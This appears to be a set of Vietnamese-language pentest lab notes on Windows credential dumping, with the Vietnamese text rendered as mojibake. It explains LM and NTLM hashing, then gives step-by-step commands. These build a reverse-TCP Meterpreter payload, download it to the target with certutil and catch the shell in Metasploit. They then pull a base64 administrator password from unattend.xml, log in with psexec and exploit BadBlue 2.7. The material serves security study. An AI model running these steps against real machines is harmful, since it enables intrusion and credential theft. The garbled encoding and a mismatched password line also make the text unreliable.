# Windows Credential Dumping

Cáº§n cÃ³ phiÃªn nÃ¢ng cao Ä‘á»ƒ thu tháº­p Hash, vÃ¬ váº­y cáº§n leo thang Ä‘áº·c quyá»n trÆ°á»›c khi Ä‘i vÃ o pháº§n nÃ y 

## Windows Password Hashes

Windows lÆ°u trá»¯ cÃ¡c bÄƒm password user á»Ÿ SAM (Security Accounts Manager) database

Windows cÃ³ 2 loáº¡i bÄƒm:

- LM -> ko cÃ²n tháº¥y nhiá»u ná»¯a vÃ¬ cháº¡y á»Ÿ windows cÅ© (vista,..)
- NTLM

## LM (LanMan)

LM lÃ  thuáº­t toÃ¡n bÄƒm máº·c Ä‘á»‹nh Ä‘Ã£ Ä‘Æ°á»£c triá»ƒn khanh trÃªn windows cháº¡y kernel trÆ°á»›c NT 4.0

QÃºa trÃ¬nh bÄƒm:

- Pass Ä‘Æ°á»£c chia thÃ nh 2 pháº§n 7 kÃ­ tá»± 

- CÃ¡c kÃ­ tá»± Ä‘Æ°á»£c upcase viáº¿t hoa (vÃ¬ váº­y náº¿u máº­t kháº©u cÃ³ chá»¯ hoa vÃ  chá»¯ thÆ°á»ng thÃ¬ Ä‘á»u ko khÃ¡c gÃ¬ nhau vÃ¬ Ä‘á»u pháº£i lÃªn chá»¯ hoa)

- má»—i pháº§n sau Ä‘Ã³ Ä‘Æ°á»£c hash riÃªng biá»‡t báº±ng DES 

=> LM hash lÃ  phÆ°Æ¡ng thá»©c yáº¿u vÃ  dá»… dÃ ng báº» khÃ³a 

![alt text](image-2.png)


## NTLM (NTHash)

lÃ  giao thá»©c xÃ¡c thá»±c Ä‘Æ°á»£c sá»­ dá»¥ng giá»¯a cÃ¡c mÃ¡y tÃ­nh, bao gá»“m password vÃ  username

NTLM cáº£i thiá»‡n so vá»›i LM:

- KhÃ´ng chia lÃ m 2 khá»‘i

- phÃ¢n biá»‡t chá»¯ hoa chá»¯ thÆ°á»ng

- cho phÃ©p sá»­ dá»¥ng cÃ¡c kÃ­ tá»± Ä‘áº·c bieejt

![alt text](image-3.png)


## TÃ¬m kiáº¿m Password trong Windows Configurations Files

Kali Machine:

táº¡o `meterpreter` x64 payload

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > payload.exe`

Táº¡o 1 server Ä‘á»ƒ Ä‘áº©y payload lÃªn:

`python -m SimpleHTTPServer 80`

VÃ o Target machine:

`cd Desktop`

Download the payload file

`certutil -urlcache -f http://10.10.4.2/payload.exe payload.exe`

Trá»Ÿ vá» Kali machine:

Má»Ÿ MSF:

`use multi/handler`

`set payload windows/x64/meterpreter/reverse_tcp`

`set LPORT 1234`

`set LHOST 10.10.4.2`

`run`

-> táº¡o ra port nghe, vÃ o Target machine Ä‘á»ƒ cháº¡y payload `payload.exe` vá»«a táº£i vá», ta sáº½ cÃ³ Ä‘Æ°á»£c reverse shell

trá»Ÿ láº¡i Kali machine

`sysinfo` 

BÃ¢y giá» ta sáº½ tÃ¬m file `unattend.xml` hoáº·c `autounattend.xml`

`search -f unattend.xml`

Hoáº·c tÃ¬m tay:

`cd C:\\`

`cd Windows`

`cd Panther`

`dir`

`download unattend.xml`

Má»Ÿ 1 cmd tab khÃ¡c:

`cat unattend.xml`

![alt text](image-4.png)

`administrator` user configured base64 password is `QWRtaW5AMTIz`

decode base64 `QWRtaW5AMTIz` ta Ä‘Æ°á»£c password: `Admin@123`

Test the `administrator:Admin@123root` credentials with the psexec tool

`psexec.py administrator@10.4.19.9` -> nháº­p password

`whoami` -> Ä‘Ã£ leo quyá»n cao nháº¥t

## Dumping hashes with Mimikatz

### Lab

TrÃªn kali cá»§a attacker:

`nmap 10.2.29.32`

tráº£ vá» cÃ³ port 80

`nmap -sV -p 80 10.2.29.32`

80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

ThÃ´ng tin mÃ¡y chá»§ vÃ  phiÃªn báº£n

ğŸ“Œ Exploit BadBlue 2.7 with metasploit

`msfconsole -q`

`search badblue`

`use exploit/windows/http/badblue_passthru`

`set RHOSTS 10.2.29.32`

`run`

Sau khi cháº¡y ta sáº½ cÃ³ phiÃªn vÃ o Ä‘Æ°á»£c mÃ¡y chá»§

`sysinfo`

`getuid` 













